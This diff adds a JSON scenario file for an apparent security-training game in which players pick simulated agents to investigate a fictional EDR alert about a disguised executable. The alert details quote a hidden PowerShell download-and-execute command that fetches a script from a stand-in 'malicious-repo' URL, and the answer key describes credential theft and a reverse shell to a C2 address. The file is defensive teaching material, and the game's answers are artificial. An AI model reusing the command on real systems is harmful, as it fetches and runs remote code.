@@ -1,0 +1,359 @@
+{
+  "scenario": {
+    "id": "david-squiller-case",
+    "title": "The Suspicious Puppy",
+    "description": "A critical alert has fired on a Sales Director's workstation. Deploy your Wise Agents to connect the dots.",
+    "initialAlert": {
+      "title": "WINDOWS METHODOLOGY [Powershell DownloadFile]",
+      "host": "dsquiller-finance-pc",
+      "severity": "Medium",
+      "timestamp": "2024-02-11 14:23:41 UTC",
+      "rawDetails": "Alert ID: EDR-2024-02-11-87634\nSource: Endpoint Detection & Response (EDR)\nRule: Suspicious PowerShell Download Activity\nUser: david.squiller@company.com\nHostname: dsquiller-finance-pc\nIP Address: 10.42.158.73\nOS: Windows 10 Enterprise (Build 19045)\nDomain: CORP\\dsquiller\n\nProcess Tree:\n└─ explorer.exe (PID: 4892)\n   └─ 19625_cutepuppyjpg.exe (PID: 7341)\n      └─ powershell.exe (PID: 8156)\n         • Command Line: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/malicious-repo/payload/main/stage2.ps1')\"\n         • Working Directory: C:\\Users\\dsquiller\\Downloads\n         • Parent Image: C:\\Users\\dsquiller\\Downloads\\19625_cutepuppyjpg.exe\n         • File Hash (SHA256): 3a7b4f2c9d8e1f0a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a\n\nKey Indicators:\n• File extension masquerading (.exe disguised as .jpg)\n• PowerShell execution policy bypass\n• Hidden window style (-WindowStyle Hidden)\n• Remote script download from GitHub\n• No digital signature on parent executable\n• First-time file execution on this endpoint\n\nNetwork Activity:\n• Outbound HTTPS to raw.githubusercontent.com (Port 443)\n• DNS Query: raw.githubusercontent.com → 185.199.108.133\n• Connection established at 14:23:42 UTC\n• Total data transferred: 47.3 KB downloaded\n\nRisk Factors:\n⚠️ Execution from user Downloads folder\n⚠️ Unsigned executable with suspicious naming\n⚠️ PowerShell download pattern common in malware campaigns\n⚠️ User has access to sensitive Sales and Finance data\n⚠️ No prior PowerShell usage history for this user\n\nRecommendation: Investigate immediately to determine if this is malicious activity or legitimate business process."
+    },
+    "questions": [
+      {
+        "id": "q1",
+        "order": 1,
+        "text": "What happened on this endpoint?",
+        "category": "What Happened?",
+        "locked": false,
+        "correctAgent": "EDR",
+        "timeSaved": 3,
+        "answers": {
+          "EDR": {
+            "confidence": 40,
+            "text": "A file named '19625_cutepuppyjpg.exe' (masquerading as a JPG image) executed PowerShell with bypassed execution policy to download and execute a script from GitHub. This is a common malware delivery technique.",
+            "isCorrect": true,
+            "transparencySteps": [
+              "[Wise] Querying EDR for process creation events on dsquiller-finance-pc...",
+              "[Wise] Found parent process: 19625_cutepuppyjpg.exe",
+              "[Wise] Analyzing child process: powershell.exe with -ExecutionPolicy Bypass flag",
+              "[Wise] Decoding command line arguments...",
+              "[Wise] Detected download from raw.githubusercontent.com",
+              "[Wise] Assessment: File extension masquerading detected (.exe posing as .jpg)"
+            ]
+          },
+          "NDR": {
+            "confidence": 15,
+            "text": "Network traffic logs show HTTPS connections from dsquiller-finance-pc, but without endpoint context, I cannot determine if this is malicious or routine browsing activity.",
+            "isCorrect": false,
+            "hint": "Consider using the EDR Agent for endpoint process-related questions.",
+            "transparencySteps": [
+              "[Wise] Querying NDR for network traffic from dsquiller-finance-pc...",
+              "[Wise] Found HTTPS connections to github.com domain",
+              "[Wise] Unable to inspect encrypted traffic content",
+              "[Wise] Warning: Network data alone insufficient for process-level analysis"
+            ]
+          },
+          "Identity": {
+            "confidence": 10,
+            "text": "David Squiller is authenticated and has standard user permissions. No authentication anomalies detected, but this doesn't explain the process behavior.",
+            "isCorrect": false,
+            "hint": "Consider using the EDR Agent for endpoint process-related questions.",
+            "transparencySteps": [
+              "[Wise] Querying Identity system for user: david.squiller...",
+              "[Wise] User authentication status: Active",
+              "[Wise] No failed login attempts detected",
+              "[Wise] Warning: Identity data cannot determine process-level activity"
+            ]
+          },
+          "IVX": {
+            "confidence": 12,
+            "text": "File sandboxing requires the sample to be submitted. No sandbox analysis available for this file yet.",
+            "isCorrect": false,
+            "hint": "Consider using the EDR Agent for endpoint process-related questions.",
+            "transparencySteps": [
+              "[Wise] Checking IVX sandbox for file: 19625_cutepuppyjpg.exe...",
+              "[Wise] No existing analysis found",
+              "[Wise] File not yet submitted to sandbox environment",
+              "[Wise] Would you like to queue this file for detonation?"
+            ]
+          }
+        }
+      },
+      {
+        "id": "q2",
+        "order": 2,
+        "text": "Who is this user and are they a high-value target?",
+        "category": "Who is Affected?",
+        "locked": true,
+        "correctAgent": "Identity",
+        "timeSaved": 2,
+        "answers": {
+          "Identity": {
+            "confidence": 12,
+            "text": "David Squiller is a Director in the Sales department. While not marked as a VIP or superuser, his director-level position makes him a potentially valuable target for attackers seeking sales data or customer information.",
+            "isCorrect": true,
+            "transparencySteps": [
+              "[Wise] Querying Identity system for user profile: david.squiller...",
+              "[Wise] Found: David Squiller",
+              "[Wise] Title: Director",
+              "[Wise] Department: Sales",
+              "[Wise] VIP Status: No",
+              "[Wise] Superuser/Admin: No",
+              "[Wise] Analyzing user access patterns over 90-day lookback period...",
+              "[Wise] Assessment: Director-level access to sensitive sales and customer data"
+            ]
+          },
+          "EDR": {
+            "confidence": 8,
+            "text": "EDR logs show this is the local user 'dsquiller' on the endpoint, but EDR doesn't have organizational hierarchy or role information.",
+            "isCorrect": false,
+            "hint": "Consider using the Identity Agent for user profile and role questions.",
+            "transparencySteps": [
+              "[Wise] Querying EDR for user information...",
+              "[Wise] Local username: dsquiller",
+              "[Wise] Warning: EDR lacks organizational context and user role data"
+            ]
+          },
+          "NDR": {
+            "confidence": 5,
+            "text": "Network logs show traffic from dsquiller-finance-pc but don't contain user role or organizational hierarchy information.",
+            "isCorrect": false,
+            "hint": "Consider using the Identity Agent for user profile and role questions.",
+            "transparencySteps": [
+              "[Wise] Querying NDR for source host information...",
+              "[Wise] Hostname: dsquiller-finance-pc",
+              "[Wise] Warning: Network data does not include user role information"
+            ]
+          },
+          "IVX": {
+            "confidence": 5,
+            "text": "IVX analyzes file behavior, not user profiles. Unable to determine user importance from sandbox data.",
+            "isCorrect": false,
+            "hint": "Consider using the Identity Agent for user profile and role questions.",
+            "transparencySteps": [
+              "[Wise] IVX sandbox focuses on file behavior analysis",
+              "[Wise] User organizational context not available in this data source"
+            ]
+          }
+        }
+      },
+      {
+        "id": "q3",
+        "order": 3,
+        "text": "Is this tool usage normal for this user's role?",
+        "category": "Is it Expected?",
+        "locked": true,
+        "correctAgent": "EDR",
+        "timeSaved": 2.5,
+        "answers": {
+          "EDR": {
+            "confidence": 11,
+            "text": "No. Sales Directors do not typically run PowerShell scripts, especially with execution policy bypasses to download code from the internet. This behavior is highly anomalous for this user's role.",
+            "isCorrect": true,
+            "transparencySteps": [
+              "[Wise] Analyzing historical PowerShell usage for david.squiller...",
+              "[Wise] Checking behavioral baseline for Sales department...",
+              "[Wise] Historical data: 0 PowerShell executions in last 90 days",
+              "[Wise] Department norm: Sales users average 0.1 PowerShell events per month",
+              "[Wise] IT/Admin users average: 45 PowerShell events per month",
+              "[Wise] Assessment: This activity is highly unusual for this user profile"
+            ]
+          },
+          "Identity": {
+            "confidence": 65,
+            "text": "Based on role information, Sales Directors typically use business applications like Salesforce, email, and Office tools. PowerShell scripting would be unusual, but I need EDR context to confirm actual tool usage.",
+            "isCorrect": false,
+            "hint": "The Identity Agent knows roles, but the EDR Agent can analyze actual tool usage patterns.",
+            "transparencySteps": [
+              "[Wise] Reviewing standard tools for Sales department...",
+              "[Wise] Expected tools: Salesforce, Microsoft Office, Email clients",
+              "[Wise] PowerShell typically authorized for: IT, DevOps, System Admins",
+              "[Wise] Warning: Cannot confirm actual usage without endpoint data"
+            ]
+          },
+          "NDR": {
+            "confidence": 10,
+            "text": "Network traffic shows HTTPS connections, which is normal for any user role. Cannot determine application-level tool usage from network data alone.",
+            "isCorrect": false,
+            "hint": "Consider using the EDR Agent to analyze tool usage and process execution patterns.",
+            "transparencySteps": [
+              "[Wise] Analyzing network traffic patterns...",
+              "[Wise] HTTPS connections detected (standard for all roles)",
+              "[Wise] Warning: Cannot determine specific application usage from encrypted traffic"
+            ]
+          },
+          "IVX": {
+            "confidence": 8,
+            "text": "IVX determines file maliciousness, not whether tool usage aligns with user roles.",
+            "isCorrect": false,
+            "hint": "Consider using the EDR Agent to analyze tool usage and process execution patterns.",
+            "transparencySteps": [
+              "[Wise] IVX sandbox analyzes file behavior, not user role alignment",
+              "[Wise] Recommend using EDR for behavioral baseline analysis"
+            ]
+          }
+        }
+      },
+      {
+        "id": "q4",
+        "order": 4,
+        "text": "Was the downloaded file malicious?",
+        "category": "What Happened?",
+        "locked": true,
+        "correctAgent": "IVX",
+        "timeSaved": 4,
+        "answers": {
+          "IVX": {
+            "confidence": 11,
+            "text": "Yes. Sandbox analysis reveals the downloaded script contains a credential stealer targeting browser passwords, cryptocurrency wallets, and establishes a reverse shell connection to a known C2 server.",
+            "isCorrect": true,
+            "transparencySteps": [
+              "[Wise] Submitting file to IVX sandbox for detonation...",
+              "[Wise] Executing script in isolated environment...",
+              "[Wise] Detected behavior: File system enumeration for browser data",
+              "[Wise] Detected behavior: Registry access to credential stores",
+              "[Wise] Detected behavior: Outbound connection attempt to 178.23.145.92:4444",
+              "[Wise] Cross-referencing with threat intelligence...",
+              "[Wise] IP 178.23.145.92 identified as known C2 infrastructure",
+              "[Wise] Verdict: Malicious - Credential theft and C2 communication"
+            ]
+          },
+          "EDR": {
+            "confidence": 70,
+            "text": "EDR shows the file executed suspicious commands, but without sandbox analysis, I cannot definitively confirm malicious payload behavior or C2 communication attempts.",
+            "isCorrect": false,
+            "hint": "The IVX Agent specializes in file sandboxing and maliciousness determination.",
+            "transparencySteps": [
+              "[Wise] Analyzing EDR telemetry for child processes...",
+              "[Wise] Suspicious indicators: Execution policy bypass, remote script download",
+              "[Wise] Warning: EDR cannot detonate files in isolated environment",
+              "[Wise] Recommend: IVX sandbox analysis for definitive verdict"
+            ]
+          },
+          "NDR": {
+            "confidence": 45,
+            "text": "Network logs show the endpoint connected to an external IP with suspicious reputation, but without file analysis, cannot confirm the payload's intent.",
+            "isCorrect": false,
+            "hint": "The IVX Agent specializes in file sandboxing and maliciousness determination.",
+            "transparencySteps": [
+              "[Wise] Analyzing network connections from dsquiller-finance-pc...",
+              "[Wise] Found connection to 178.23.145.92 (Germany)",
+              "[Wise] Threat intelligence: IP has medium reputation score",
+              "[Wise] Warning: Network data insufficient for file verdict"
+            ]
+          },
+          "Identity": {
+            "confidence": 5,
+            "text": "Identity systems track users and access, not file maliciousness. Unable to analyze file content.",
+            "isCorrect": false,
+            "hint": "The IVX Agent specializes in file sandboxing and maliciousness determination.",
+            "transparencySteps": [
+              "[Wise] Identity system does not perform file analysis",
+              "[Wise] Recommend: IVX Agent for malware analysis"
+            ]
+          }
+        }
+      },
+      {
+        "id": "q5",
+        "order": 5,
+        "text": "What did this endpoint do on the network after infection?",
+        "category": "What Happened?",
+        "locked": true,
+        "correctAgent": "NDR",
+        "timeSaved": 2.5,
+        "answers": {
+          "NDR": {
+            "confidence": 10,
+            "text": "The endpoint established a connection to 178.23.145.92:4444, a confirmed Tor exit node in Gunzenhausen, Germany. This IP has generated 304 brute force attempts across your network in the last 24 hours, indicating a coordinated attack campaign.",
+            "isCorrect": true,
+            "transparencySteps": [
+              "[Wise] Querying NDR for post-infection network activity...",
+              "[Wise] Found outbound connection to 178.23.145.92:4444",
+              "[Wise] Performing geolocation lookup...",
+              "[Wise] Location: Gunzenhausen, Germany",
+              "[Wise] Cross-referencing with Tor exit node database...",
+              "[Wise] Confirmed: IP is active Tor exit node",
+              "[Wise] Correlating with other alerts for this IP...",
+              "[Wise] Found: 304 brute force attempts, 33 password spray events in last 24 hours",
+              "[Wise] Assessment: Part of larger coordinated attack campaign"
+            ]
+          },
+          "EDR": {
+            "confidence": 35,
+            "text": "EDR shows the PowerShell process initiated network connections, but endpoint telemetry lacks full network context like geolocation, connection timing, and traffic correlation across multiple hosts.",
+            "isCorrect": false,
+            "hint": "The NDR Agent specializes in network traffic analysis and lateral movement detection.",
+            "transparencySteps": [
+              "[Wise] Checking EDR for network connection events...",
+              "[Wise] PowerShell process initiated outbound connections",
+              "[Wise] Warning: EDR has limited network traffic visibility",
+              "[Wise] Recommend: NDR Agent for comprehensive network analysis"
+            ]
+          },
+          "IVX": {
+            "confidence": 55,
+            "text": "Sandbox analysis showed the malware attempts C2 communication, but the sandboxed network is isolated. NDR is needed for actual network traffic in your production environment.",
+            "isCorrect": false,
+            "hint": "The NDR Agent specializes in network traffic analysis and lateral movement detection.",
+            "transparencySteps": [
+              "[Wise] Reviewing sandbox network behavior...",
+              "[Wise] Detected attempted connection to C2 server in sandbox",
+              "[Wise] Warning: Sandbox uses isolated network environment",
+              "[Wise] Cannot observe actual production network traffic from IVX"
+            ]
+          },
+          "Identity": {
+            "confidence": 5,
+            "text": "Identity logs track authentication and access, not network traffic or C2 communication.",
+            "isCorrect": false,
+            "hint": "The NDR Agent specializes in network traffic analysis and lateral movement detection.",
+            "transparencySteps": [
+              "[Wise] Identity system does not monitor network traffic",
+              "[Wise] Recommend: NDR Agent for network activity analysis"
+            ]
+          }
+        }
+      },
+      {
+        "id": "q6",
+        "order": 6,
+        "text": "Should we escalate this alert to Critical?",
+        "category": "Do We Care?",
+        "locked": true,
+        "correctAgent": "WISE",
+        "timeSaved": 1.5,
+        "isDecision": true,
+        "answers": {
+          "WISE": {
+            "confidence": 11,
+            "text": "YES - ESCALATE TO CRITICAL. The evidence is irrefutable: (1) File masquerading as image executed malicious PowerShell, (2) Director-level user targeted (access to sensitive sales data), (3) Anomalous tool usage for role, (4) Confirmed malware with credential theft capability, (5) C2 communication to Tor node linked to 304+ brute force attempts. This is an active compromise requiring immediate remediation.",
+            "isCorrect": true,
+            "decision": "ESCALATE",
+            "remediationActions": [
+              "Isolate dsquiller-finance-pc from network",
+              "Disable Active Directory account for david.squiller",
+              "Revoke all active session tokens",
+              "Force password reset with MFA re-enrollment",
+              "Block IP 178.23.145.92 at perimeter firewall",
+              "Initiate forensic imaging of endpoint",
+              "Notify Sales leadership and IR team"
+            ],
+            "transparencySteps": [
+              "[Wise] Synthesizing all investigation findings...",
+              "[Wise] Attack vector: Phishing/Social Engineering → File Masquerading",
+              "[Wise] Target value: Director-level user with sales data access",
+              "[Wise] Behavioral anomaly: PowerShell usage unprecedented for this role",
+              "[Wise] Malware capability: Credential theft + C2 communication",
+              "[Wise] Network indicator: Connection to Tor node with 304 brute force events",
+              "[Wise] Correlation complete: This matches APT credential harvesting patterns",
+              "[Wise] RECOMMENDATION: Immediate escalation and containment required"
+            ]
+          }
+        }
+      }
+    ],
+    "winConditions": {
+      "minConfidenceScore": 95,
+      "minTimeSaved": 12,
+      "allQuestionsAnswered": true
+    },
+    "metrics": {
+      "totalQuestions": 6,
+      "totalTimeSavingsPossible": 15.5,
+      "perfectPlaytimeTarget": 45
+    }
+  }
+}
